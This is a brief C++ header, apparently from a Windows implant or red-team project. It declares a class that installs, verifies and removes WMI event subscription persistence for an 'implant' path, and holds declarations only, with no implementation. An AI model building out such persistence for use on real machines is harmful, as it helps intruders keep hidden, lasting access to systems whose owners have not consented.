#pragma once
#include <windows.h>
#include <string>

namespace persistence {

class WmiPersistence {
public:
    // Installs WMI event subscription persistence
    static bool Install(const std::wstring& implantPath, const std::wstring& taskName);

    // Verifies if the WMI persistence is installed
    static bool Verify(const std::wstring& taskName);

    // Uninstalls the WMI event subscription
    static bool Uninstall(const std::wstring& taskName);
};

} // namespace persistence
